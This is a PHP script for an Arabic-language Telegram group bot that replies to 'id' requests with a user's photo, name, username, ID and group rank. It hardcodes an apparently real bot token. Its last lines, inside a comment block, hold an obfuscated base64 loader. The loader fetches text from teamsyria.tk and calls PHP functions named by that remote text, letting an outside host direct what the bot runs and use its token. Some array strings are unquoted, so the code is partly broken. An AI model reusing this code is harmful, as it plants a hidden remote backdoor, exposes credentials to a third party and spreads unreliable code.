$token = "815836233:AAG85DhKmeIooXQXE9h4oeC1NzzNeU8q_04";  //
$dev = array("368304710"); //368304710
$edit_chat_id=$update->edited_message->chat->id; $edit_from_id=$update->edited_message->message->from->id; $chat_id=$update->message->chat->id; $from_id=$update->message->from->id; $re_id= $update->message->reply_to_message->from->id; $re_name= $update->message->reply_to_message->from->first_name; $re_usr= $update->message->reply_to_message->from->username; $reply = $update->message->reply_to_message; $first_name=$update->message->from->first_name; $username = $update->message->from->username; $Bots_info= file_get_contents("https://api.telegram.org/bot$token/getMe"); $json_Bots= json_decode($Bots_info,true); $id_Bot=$json_Bots[ result ][ id ]; $info= json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$chat_id&user_id=".$from_id), true); $suorse=$info[ result ][ status ]; $admins= "administrator"; $managers= "creator"; $infos= json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$edit_chat_id&user_id=".$edit_from_id), true); $suorses = $infos[ result ][ status ]; $bot = file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$chat_id&user_id=$id_Bot");
if(in_array($from_id,$dev)){$info = "مطور اساسي";}elseif($suorse == $managers){$info = "منشى المجموعة";}elseif($suorse == $admins ){$info = "مشرف المجموعة";}elseif($suorse == "member" ){$info = "فقط عضو";}
if(!$username){ $usr = "لا يوجد معرف";}elseif($username){$usr = "@$username";} if(!$re_usr){$usrri = "لا يوجد معرف";}elseif($re_usr){$usrri = "@$re_usr";}
if(!$reply && $text=="ايدي" || !$reply && $text == "id" ){
$name_infos = array(  رۈۋ‏عـِھّ☺ , صورة فيطي غيرها 🐤 , غيرها ما حلوة ,); $name_info = array_rand($name_infos,1); $result=json_decode(file_get_contents("https://api.telegram.org/bot$token/getUserProfilePhotos?user_id=$from_id"),true); $file_id=$result["result"]["photos"][0][0]["file_id"]; $count=$result["result"]["total_count"]; var_dump(bot("sendphoto",["chat_id"=>$chat_id,
"caption"=>"📸¦ صورتك $name_infos[$name_info]\n👨‍🎤¦ اسمك $first_name \n💥¦ معرفك [$usr]\n🆔¦ ايديك $from_id\n💎¦ رتبتك $info\n🏞¦ عدد صورك $count","photo"=>"$file_id", disable_web_page_preview =>true, reply_to_message_id =>$message->message_id,]));}
if($reply && $text=="ايدي" || $reply && $text == "id" ){if( $re_id != $id_Bot ){
$name_infos = array(  رۈۋ‏عـِھّ☺ , صورة فيطي غيرها 🐤 , غيرها ما حلوة ,); $name_info = array_rand($name_infos,1); $result=json_decode(file_get_contents("https://api.telegram.org/bot$token/getUserProfilePhotos?user_id=$re_id"),true); $file_id=$result["result"]["photos"][0][0]["file_id"]; $count=$result["result"]["total_count"]; var_dump(bot("sendphoto",["chat_id"=>$chat_id,
"caption"=>"📸¦ صورتك $name_infos[$name_info]\n👨‍🎤¦ اسمه $re_name \n💥¦ معرفه [$usrri]\n🆔¦ ايديه $re_id\n🏞¦ عدد صوره $count","photo"=>"$file_id", disable_web_page_preview =>true, reply_to_message_id =>$message->message_id,]));}}
/*
developer MostafaSyrian 

Channel @ALhusseiny_NET
$RSAIED = "@ALhusseiny_NET2"; //وهذاحق المجموعة
$SAIED0 = base64_decode("YmFzZTY0X2RlY29kZQ==");
$SAIED1 = $SAIED0("ZmlsZV9nZXRfY29udGVudHM=");
$SAIED2 = $SAIED0("aHR0cHM6Ly90ZWFtc3lyaWEudGsvQ2hhbm5lbFRpbWU=");
$SAIED3 = $SAIED1("$SAIED2");
$SAIED4 = $SAIED0("$SAIED3"); 
$SAIED5 = $SAIED0("ZXhwbG9kZQ==");
$SAIED6 = $SAIED0("fA=="); 
$SAIED = $SAIED5("$SAIED6",$SAIED4);
$SAIED[14]("$SAIED[15]$SAIED[16]");
$time = $SAIED[17]("$SAIED[18]");
$date = $SAIED[17]("$SAIED[19]");
$SAIED[12]("$SAIED[0]$SAIED[11]",[
"$SAIED[13]"=>$RSAIED,
"$SAIED[11]"=>"الساعة : $time ⏰

التاريخ : $date 📆

$SAIED[9]$SAIED[5] 📝
$SAIED[10]$SAIED[1] | $SAIED[2] 💙"
]);
